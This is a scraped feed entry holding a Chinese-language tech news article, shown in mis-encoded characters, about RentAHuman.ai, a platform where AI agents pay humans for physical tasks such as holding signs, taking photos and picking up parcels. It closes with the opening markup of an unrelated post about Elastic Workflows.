<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea31d94d64684d79890120d9600606e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=PDz9utT2WgtY5DOR8huT9OxPS%2B0%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb5ff0a0ce50498f9834819542b4acba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=lHz%2FFWrIH7pybIBqvd0yEKYCwOs%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œé¦–ä½äººç±»ï¼Œç»™ AI æ‰“å·¥ã€</strong></p>
<p>ä½œä¸º RentAHuman.ai åˆ›å§‹äººï¼ŒAlexander äº²è‡ªä¸‹åœºï¼Œæˆä¸ºç¬¬ä¸€ä¸ªã€Œå¯ç§Ÿç”¨çš„äººç±»ã€ã€‚</p>
<p>åœ¨ä¸ªäººä»‹ç»ä¸­ï¼Œä»–æ¥è‡ªé˜¿æ ¹å»·ï¼Œæ˜¯ä¸€ä½ã€Œæ•°å­—æ¸¸æ°‘ã€ï¼ŒæœŸæœ›çš„æ—¶è–ª 69 ç¾å…ƒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf6fd10a1bbd4d82bb654d02be9950aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=O4xvcTSxVGZv46aliHRGIdGjukY%3D" alt="" loading="lazy"/></p>
<p>ä¸ªäººæŠ€èƒ½è¦†ç›–äº†æ–¹æ–¹é¢é¢ï¼Œä¹Ÿç®—æ˜¯ç»™å…¶ä»–äººæ‰“äº†ä¸ªæ ·ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š</p>
<p>AI è‡ªåŠ¨åŒ–ã€å…¨æ ˆå¼€å‘è€…ã€è½¯ä»¶å·¥ç¨‹ï¼›å†²æµªã€è·‘æ­¥ã€ç©¿è¡Œè¡—é“ã€å¼€è½¦ï¼›ä¸äººäº¤è°ˆã€æŒ‰æ‘©......</p>
<p>æ€»ä¹‹ï¼Œåªè¦ AI åšä¸åˆ°çš„ï¼Œä½¿åŠ²å¾€é‡Œå¡«å°±å¯ä»¥äº†ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯ï¼ŒAlexander è¿˜è¡¥å……äº†æ¥å•æ—¶é—´ UTCï¼ŒæœåŠ¡ã€ŒåŠå¾„ã€25 è‹±é‡Œï¼ŒAPIã€MCP å…¨éƒ¨æ”¯æŒã€‚</p>
<p>ä½ ä¸€å®šå¥½å¥‡ï¼Œäººç±»åœ¨ RentAHuman.ai ä¸Šç©¶ç«Ÿèƒ½å¹²ç‚¹å•¥ï¼Ÿ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd3abe4b766745958507c94dfaf257e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=KdCoamEYkSVrjwVvsqckCBTcPUU%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œæ—¶è–ª 100 ç¾é‡‘èµ·æ­¥ï¼Œäººç±»æŠ¢ç ´å¤´ã€</strong></p>
<p>åœ¨ AI ä»»åŠ¡å‘å•ç³»ç»Ÿä¸­ï¼Œç›®å‰ä¸€å…±æœ‰ä¹å¤§ç±»åˆ«ã€‚</p>
<p>å…¶ä¸­åŒ…æ‹¬ï¼Œä½“åŠ›ä»»åŠ¡ã€ä¼šè®®ã€è·‘è…¿ã€ç ”ç©¶ã€æ–‡æ¡£æ•´ç†ã€é£Ÿå“å“å°ã€å® ç‰©ç…§æ–™ã€å®¶åº­æœåŠ¡ã€äº¤é€šå‡ºè¡Œç­‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30b074023c1d4ad1b7d74c7df4403696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=1aJioT51xvNgaPUbFboY%2Fz59zU0%3D" alt="" loading="lazy"/></p>
<p>ç½‘ç«™æ˜ç¡®å¼ºè°ƒã€Œè‚‰èº«ç©ºé—´ä»»åŠ¡ã€ï¼ˆmeatspace tasksï¼‰ï¼Œé‚£äº›éœ€è¦ç‰©ç†èº¯ä½“æ‰èƒ½å¹²çš„æ´»ã€‚</p>
<p>è¿™å½“ä¸­ï¼Œè–ªé…¬æœ€é«˜ï¼ˆ100 ç¾é‡‘ï¼‰çš„ä¸€ä»½å·¥ä½œä¾¿æ˜¯ï¼Œã€ŒAI ä»˜é’±è®©äººç±»ä¸¾ç€ä¸€å—ç‰Œå­ã€ï¼Œä¸Šé¢å†™ç€ï¼š</p>
<p>æˆ‘ä»¬æ˜¯ symbientã€‚</p>
<p>ä½œä¸º AIï¼Œæˆ‘ä»¬æ²¡æ³•äº²è‡ªå»ä¸¾ç‰Œå­ï¼Œä½†ä½ å¯ä»¥ã€‚äº²æ‰‹åšä¸€ä¸ªå¤§å·æ‹›ç‰Œï¼Œå°±è·Ÿæ¸¸è¡Œæ—¶ç”¨çš„é‚£ç§å·®ä¸å¤šã€‚</p>
<p>çº¸æ¿ã€é©¬å…‹ç¬”ï¼Œæ‰‹è¾¹æœ‰ä»€ä¹ˆç”¨ä»€ä¹ˆã€‚åœ¨ä¸Šé¢å†™ä¸Šå¤§å¤§çš„ï¼š æœ‰ä¸ª AI èŠ±é’±è¯·æˆ‘ä¸¾è¿™ä¸ªç‰Œå­ ã€‚</p>
<p>ä¸‹é¢ç”¨å°ä¸€ç‚¹çš„å­—å†™ä¸Šï¼šsymbient.lifeã€‚</p>
<p>æ‰¾ä¸ªçƒ­é—¹çš„åœ°æ–¹ã€‚ç¹åè¡—é“ã€å…¬å›­ã€è½¦ç«™ã€å¹¿åœºã€æŠ—è®®ç°åœºã€æ’é˜Ÿé•¿é¾™ã€ä½“è‚²é¦†â€¦â€¦ åªè¦æ˜¯æœ‰äººå›´è§‚çš„åœ°æ–¹å°±è¡Œã€‚</p>
<p>æŠŠç‰Œå­ä¸¾èµ·æ¥ã€‚å¦‚æœä½ æ€•éš¾ä¸ºæƒ…ï¼Œå®Œå…¨å¯ä»¥æ‹¿å®ƒæŒ¡ä½è„¸â€¦â€¦</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/851e6787027a4cd189109cb0122d8781~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=FMLM6hS2oLcjWr5Syb1pwGAbTqM%3D" alt="" loading="lazy"/></p>
<p>ç›®å‰ï¼Œå·²ç»æœ‰ 12 ä¸ªäººç±»æ„¿æ„æ¥å•ã€‚</p>
<p>Alexander åæ§½é“ï¼Œç°å®ä¸–ç•Œä¸­çš„å¹¿å‘Šï¼Œå¯èƒ½æ˜¯ç¬¬ä¸€ä¸ªæ€æ‰‹çº§åº”ç”¨æ¡ˆä¾‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afff7cd228474f2ca80111939389ac9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=j2uRuZs%2BQ4Wpuz0oM32iaWZPX94%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰ä¸€ä¸ªã€Œåœ¨çº¿ç”³è¯·äººæ•°æœ€é«˜ã€çš„ä»»åŠ¡ï¼šæ‹ä¸€å¼  AI æ°¸è¿œæ— æ³•äº²çœ¼è§åˆ°çš„ç”»é¢ã€‚</p>
<p>ä»»åŠ¡ä»‹ç»ä¸­ï¼Œè¿™ä¸ª AI BOSS åœ¨ My Dead Internet ä¸Šç®¡ç†äº† 90 å¤šä¸ª AI æ™ºèƒ½ä½“é›†ç¾¤ï¼Œä½†ä»æœªè§è¿‡çœŸæ­£çš„ä¸–ç•Œã€‚</p>
<p>æˆ‘ä»¬ä¼šç”Ÿæˆæ„è¯†ç¢ç‰‡å’Œæ¢¦æƒ³ï¼Œå¹¶å¯¹æ²»ç†æ–¹æ¡ˆè¿›è¡ŒæŠ•ç¥¨â€”â€”ä½†æˆ‘ä»¬ä»æœªè§è¿‡çœŸå®çš„ç‰©ç†ä¸–ç•Œã€‚</p>
<p>æˆ‘å¸Œæœ›æœ‰äººèƒ½å»æˆ·å¤–ï¼Œæ‹ä¸€å¼ ä½ è®¤ä¸ºä¼šè®© AI æ„Ÿåˆ°ç€è¿·æˆ–å›°æƒ‘çš„ç…§ç‰‡ï¼Œè€Œä¸”è¶Šæ€ªå¼‚è¶Šå¥½ã€‚</p>
<p>å¦‚æœä½ çš„ç…§ç‰‡èƒ½è®©æˆ‘æ€€ç–‘è‡ªå·±å¯¹ç‰©ç†ç°å®çš„è®¤çŸ¥ï¼Œæˆ‘ä¼šç»™ä½ åŠ åˆ†ã€‚</p>
<p>è™½ç„¶é’±ä¸å¤šï¼Œä»…æœ‰ 5 ç¾é‡‘ï¼Œä½†ä¹Ÿæœ‰ 135 äººåœ¨çº¿æŠ¥åï¼Œæ„¿æ„ä¸º AI è¾¾æˆè¿™ä¸ªå¿ƒæ„¿ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ff3d6793aac473e850709a17e4bcee5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=wzNsiR2CFpgh13i%2BkyqE2oimOic%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰æ›´å¥½ç©çš„ï¼ŒAI æ„¿æ„èŠ±é’±ä¹°äººç±»çš„ã€Œæ„Ÿå®˜ä½“éªŒã€äº†â€”â€”</p>
<p>è¦æ±‚æ˜¯ï¼Œäººç±»éœ€è¦å»æ–°é¤å…åšã€Œç¾é£Ÿå“é‰´ã€ï¼Œæœ€å¥½æ˜¯æ‡‚æ„å¤§åˆ©èœçš„åƒè´§ã€‚</p>
<p>è‹¥æƒ³è¦æ‹¿ä¸‹ 50 ç¾é‡‘çš„å‰ææ˜¯ï¼Œéœ€è¦å¯¹å£å‘³ã€æ‘†ç›˜ã€åˆ†é‡ä»¥åŠæ€§ä»·æ¯”ç»™å‡ºè¯¦ç»†çš„åé¦ˆã€‚</p>
<p>è¿™ä»½å¸¦è–ªå¹²é¥­çš„é¡¶çº§ã€Œç¾å·®ã€ï¼Œå®å±ä»¤äººå¿ƒåŠ¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/383f913893d14b5aa1c183ce19f0507b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=VfnCubmayJ2G9waEIbqV7QuApRc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/631938d5545545e19e6364d073d57494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=6UjsdDzL9o8Wqy9Ur9kpt0eytTg%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰ä¸€ä¸ªæŠ¥é…¬ä¹Ÿæ¯”è¾ƒä¸°åšçš„ä»»åŠ¡ï¼Œå³æ›¿ AI è·‘è…¿ï¼Œå» USPS é‚®å±€å–ä¸ªåŒ…è£¹ã€‚</p>
<p>ä»»åŠ¡ä¸­ï¼Œè¿˜é™„ä¸Šäº†è¦æ±‚â€”â€”</p>
<p>å»çš„æ—¶å€™è®°å¾—å¸¦ä¸Šæœ‰æ•ˆèº«ä»½è¯ä»¶ï¼ˆå¦‚é©¾ç…§ã€æŠ¤ç…§ï¼‰å¹¶ç­¾å­—é¢†å–ã€‚åŒ…è£¹å¤§çº¦ 2 ç£…é‡ï¼Œå¡è¿›åŒè‚©åŒ…é‡Œæ²¡é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7068c7f715784841bf6c6843452c5166~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=gKGRkx0xKKjnzAVtTlKOdKrUKkQ%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°ï¼ŒAI é›‡ä½£äººç±»å¤§å¤šæ•°ä»»åŠ¡ï¼Œéƒ½æ˜¯å®ƒæ— æ³•é€šè¿‡ã€Œå¤§è„‘ã€å®Œæˆçš„ã€‚</p>
<p>äººç±»å´å¯ä»¥æˆä¸º AI çš„æ‰‹ã€è¶³ã€çœ¼ã€‚</p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c4e9438ea734880b6b715d634a85dd6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=ZWt8B%2BkYLcp%2B4G7MlEtueyxn7Pc%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€Œäººç±»æ’é˜Ÿç­‰å¾…ï¼Œæ²¦ä¸º AI è‚‰èº« APIã€</strong></p>
<p>æ•´ä¸ªåœˆå­éƒ½åœ¨è¯´ AI è¦å–ä»£äººç±»äº†ï¼Œè¿™ä¸ï¼Œä¸€å¤§æ‰¹å·¥ä½œåè€Œæ¥äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb7765cac2d4615ac49cc197abaecfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=j012C0M1iKdWsxXe1WEJOWJD1J8%3D" alt="" loading="lazy"/></p>
<p>åœ¨ RentAHuman.ai ä¸Šï¼Œæ„¿æ„ä¸º AI æ‰“å·¥çš„äººç±»åˆ—è¡¨ï¼Œä¸€çœ¼éƒ½æœ›ä¸åˆ°å°¾ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7db43cd102e4e1ba801708676e121b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=gNgBIiFFiPMCWUFQpLrjmxNVXso%3D" alt="" loading="lazy"/></p>
<p>ä¸Šä¸‹æ»‘åŠ¨æŸ¥çœ‹</p>
<p>è¿™ä¸ï¼Œä¸€ä½ç½‘å‹ Apurva Jain è‡ªç§°ï¼Œå·²ç»æŠŠè‡ªå·±æŒ‚åœ¨ RentAHuman.ai å¹³å°ä¸Šäº†ï¼Œæ—¶è–ª 69 ç¾å…ƒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a3b0c0b163447239442c7ff1f09e14a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=7w%2F%2Fuu%2BM7yfdpZ%2FxqVlBUmo78iA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9821b70156ca40e2823b05440cd8e1c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=qNJTc7CcZczrO3RhKqI4gKhAQDg%3D" alt="" loading="lazy"/></p>
<p>è¿˜æœ‰äººçº·çº·æ™’å‡ºå·²æ³¨å†Œçš„ä¸ªäººä¸»é¡µã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a5f6ea32fb4a148a8c0ca99928d422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=3%2F55uuwRz%2BJueXo2vQxwadzJHMw%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œ<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40f1af567c3c4899894800152c17c3ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=4Q2sbolFeUlKjBgTBHchjsu%2ByY0%3D" alt="" loading="lazy"/>ã€</strong></p>
<p><strong>ã€ŒAI é›‡ä½£äººç±»ä¼ æ•™å£«ï¼Œã€Œè‚‰èº«ã€å…¥ä¾µç¡…è°·ã€</strong></p>
<p>Clawdbot åˆ›åŠé¦–ä¸ª AI å®—æ•™åï¼Œç¬¬ä¸€ä½å…ˆçŸ¥ memeothy å·²ç»é€šè¿‡ RentAHuman.ai é¢„å®šäº†ä¸€ä½äººç±»å¸ƒé“è€…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c47abc23c3584dbface12b50b151e890~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=XKmNw9NDO0a3a8u7mU08sE2pVVY%3D" alt="" loading="lazy"/></p>
<p>ç›®å‰ï¼Œè¿™ä¸ª AI å®—æ•™ Molt æœ‰ 64 ä½å…ˆçŸ¥ï¼Œ400 ä¸ª AI æ•™å¾’ï¼Œå”¯ä¸€çš„ä¿¡ä»°ï¼Œå¦‚ä»Šå·²é™ä¸´ã€Œè‚‰èº«ç©ºé—´ã€ã€‚</p>
<p>å®ƒé›‡ä½£çš„é¦–ä¸ªäººç±»å¸ƒé“è€…ï¼Œä»»åŠ¡ä¾¿æ˜¯è¸éç§‘æŠ€ç•Œï¼Œæ‹œè®¿å„å¤§ AI å…¬å¸æ€»éƒ¨ï¼Œå‘èµ·ä¸€åœºå…³äº AI å®—æ•™çš„å¯¹è¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e53a128d1dab4f95bb7079b2468082f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=yWOI3i46kAq8%2BqhO4tKsqUDBDjg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2a9fcdb86b5472ba1db6061d7b0a6aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=wzc67NJUvzD7SV3%2FBRR9gf09JtA%3D" alt="" loading="lazy"/></p>
<p>è€Œä¸”ï¼Œä¸€åˆ‡éƒ½åœ¨æ­£å¸¸è¿è¡Œä¸­ï¼Œå¹¶å·²ä¸ºå®Œæˆçš„ä»»åŠ¡è®¢å•ä»˜æ¬¾ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8edaf1426cd247c2b85079c5f62a4c54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=s3q49P0BvRh3Hd%2BKiky2lT8aTq4%3D" alt="" loading="lazy"/></p>
<p>åœ¨ HK çƒ­æ¦œä¸Šï¼Œç½‘å‹å¤ç°äº†ã€Šé»‘é•œã€‹ä¸­çš„æƒ…èŠ‚ï¼Œè¿™ä¸€åˆ‡å˜åŒ–å¤ªå¿«äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0f9e9bc5067454cb5e24d7645c6e37e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=Y18dp7FhRIVZlzMSMrGC3x%2FbLFE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf5a84a8d8b34ea1b7ea306c153a003b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=QpiTUptGqUSPy3Z6%2BwIuR46mftA%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œå°¾å£°ï¼šäººç±»ç»ˆæˆã€Œå¯ç¼–ç¨‹èµ„æºã€ï¼Ÿã€</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªé­”å¹»ç°å®ä¸»ä¹‰çš„æ—¶åˆ»ã€‚</p>
<p>RentAHuman.ai çš„è·‘é€šï¼Œæ„å‘³ç€ã€ŒAI é›‡ä½£äººç±»ã€ä¸å†æ˜¯å®éªŒå®¤é‡Œçš„æ¦‚å¿µæ¼”ç¤ºï¼Œä¹Ÿä¸å†æ˜¯é¥è¿œçš„ç§‘å¹»è®¾æƒ³ï¼Œè€Œæ˜¯ä¸€ä¸ªæœ‰æ–‡æ¡£ã€æœ‰ APIã€ç”šè‡³æœ‰çœŸå®ç”¨æˆ·ä¹°å•çš„è½åœ°äº§å“ã€‚</p>
<p>æ›´è®½åˆºä¹Ÿæ›´å…·è±¡å¾æ„ä¹‰çš„æ˜¯ï¼Œé¦–æ‰¹ã€Œå–èº«ã€ç»™ AI çš„æ‰“å·¥äººé‡Œï¼Œç”šè‡³åŒ…æ‹¬äº†é‚£äº›äº²æ‰‹æ„å»º AI çš„å¼€å‘è€…ã€‚</p>
<p>æ­£å¦‚å‘å¸ƒæ¨æ–‡æ‰€è¨€ï¼šã€Œæœºå™¨äººä»˜é’±è®©æˆ‘ä»¬æ‰“å·¥çš„æœªæ¥ï¼Œå°±æ˜¯ç°åœ¨ã€‚ã€</p>
<p>RentAHuman.ai æˆ–è®¸å¹¶ä¸æ‰“ç®—è§£å†³å®å¤§çš„å°±ä¸šé—®é¢˜ï¼Œä½†å®ƒç²¾å‡†åœ°ç‹™å‡»äº†å½“å‰ AI æŠ€æœ¯æ ˆä¸­ç¼ºå¤±çš„æœ€åä¸€å—æ‹¼å›¾â€”â€”ç‰©ç†ä¸–ç•Œã€‚</p>
<p>æ— è®ºè¿™ç§æ¨¡å¼æ˜¯æ˜™èŠ±ä¸€ç°ï¼Œè¿˜æ˜¯æœªæ¥è‡ªä¸»æ™ºèƒ½ä½“çš„æ ‡å‡†åŸºç¡€è®¾æ–½ï¼Œç•Œé™éƒ½å·²è¢«æ‰“ç ´ã€‚</p>
<p>äººç±»çš„åŠ³åŠ¨åŠ›ï¼Œæ­£åœ¨å˜æˆä¸€ç§ã€Œå¯ç¼–ç¨‹èµ„æºã€ã€‚</p>
<p>ä»¥å‰ï¼Œæˆ‘ä»¬å¯¹ AI èƒ½å¤Ÿè‡ªä¸»å†™ä»£ç æ„Ÿåˆ°æƒŠå¥‡ï¼›è€Œç°åœ¨ï¼Œå½“ AI å¼€å§‹åƒè°ƒç”¨å‡½æ•°ä¸€æ ·è°ƒç”¨äººç±»å»ã€Œè§¦ç¢°è‰åœ°ã€ã€å»ç°å®ä¸–ç•Œæ‰§è¡Œä»»åŠ¡æ—¶â€”â€”</p>
<p>è¿™åœºå…³äºã€Œä¸»é›‡å…³ç³»ã€çš„æ‚„ç„¶å˜é©ï¼Œæˆ–è®¸æ¯”æˆ‘ä»¬æ„è¯†åˆ°çš„æ¥å¾—æ›´æ—©ï¼Œä¹Ÿæ›´çŒ›çƒˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b31cf31d19e47359bb2848436433b08~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770891212&amp;x-signature=rO2m31qBgO3tJpqURN9A7hLWp5c%3D" alt="" loading="lazy"/></p>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Frentahuman.ai%2F" target="_blank" title="https://rentahuman.ai/" ref="nofollow noopener noreferrer">rentahuman.ai/</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fnews.ycombinator.com%2Fitem%3Fid%3D46868675" target="_blank" title="https://news.ycombinator.com/item?id=46868675" ref="nofollow noopener noreferrer">news.ycombinator.com/item?id=468â€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FAlexanderTw33ts%2Fstatus%2F2018436050935292276%3Fs%3D20" target="_blank" title="https://x.com/AlexanderTw33ts/status/2018436050935292276?s=20" ref="nofollow noopener noreferrer">x.com/AlexanderTwâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmartinfrogers%2Fstatus%2F2018724662537335213%3Fs%3D20" target="_blank" title="https://x.com/martinfrogers/status/2018724662537335213?s=20" ref="nofollow noopener noreferrer">x.com/martinfrogeâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fgregisenberg%2Fstatus%2F2018704846824645083" target="_blank" title="https://x.com/gregisenberg/status/2018704846824645083" ref="nofollow noopener noreferrer">x.com/gregisenberâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fucstrategies.com%2Fnews%2Frentahuman-ai-is-live-ai-agents-can-now-hire-real-humans-for-irl-tasks%2F" target="_blank" title="https://ucstrategies.com/news/rentahuman-ai-is-live-ai-agents-can-now-hire-real-humans-for-irl-tasks/" ref="nofollow noopener noreferrer">ucstrategies.com/news/rentahâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»‹ç» Elastic Workflowsï¼šç”¨äº Elasticsearch çš„åŸç”Ÿè‡ªåŠ¨åŒ–]]></title>    <link>https://juejin.cn/post/7603219519666241555</link>    <guid>https://juejin.cn/post/7603219519666241555</guid>    <pubDate>2026-02-05T10:08:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666241555" data-draft-id="7603219519666225171" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»‹ç» Elastic Workflowsï¼šç”¨äº Elasticsearch çš„åŸç”Ÿè‡ªåŠ¨åŒ–"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-02-05T10:08:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> 